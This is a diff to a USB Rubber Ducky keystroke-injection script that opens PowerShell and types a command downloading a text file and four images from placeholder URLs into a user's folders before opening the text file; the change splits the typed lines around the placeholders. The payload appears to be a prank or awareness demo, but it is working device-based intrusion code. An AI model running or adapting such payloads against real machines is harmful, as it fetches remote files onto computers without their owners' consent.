@@ -14,7 +14,17 @@ STRING powershell
 DELAY 300
 ENTER
 DELAY 600
-STRING Invoke-WebRequest -Uri "TEXTFILE" -OutFile "~\Desktop\a_friendly_psa.txt"; Invoke-WebRequest -Uri "EGG1" -OutFile "~\Documents\egg1.png"; Invoke-WebRequest -Uri "EGG2" -OutFile "~\Pictures\egg2.png"; Invoke-WebRequest -Uri "EGG3" -OutFile "~\Documents\My Games\egg3.png"; Invoke-WebRequest -Uri "EGG4" -OutFile "~\Downloads\egg5.png"; & ~\Desktop\a_friendly_psa.txt
+STRING Invoke-WebRequest -Uri "
+STRING TEXTFILE
+STRING " -OutFile "~\Desktop\a_friendly_psa.txt"; Invoke-WebRequest -Uri "
+STRING EGG1
+STRING " -OutFile "~\Documents\egg1.png"; Invoke-WebRequest -Uri "
+STRING EGG2
+STRING " -OutFile "~\Pictures\egg2.png"; Invoke-WebRequest -Uri "
+STRING EGG3
+STRING " -OutFile "~\Documents\My Games\egg3.png"; Invoke-WebRequest -Uri "
+STRING EGG4
+STRING " -OutFile "~\Downloads\egg5.png"; & ~\Desktop\a_friendly_psa.txt
 ENTER
 REM This script makes heavy use of the Invoke-WebRequest command, which
 REM gathers a webpage and optionally saves it
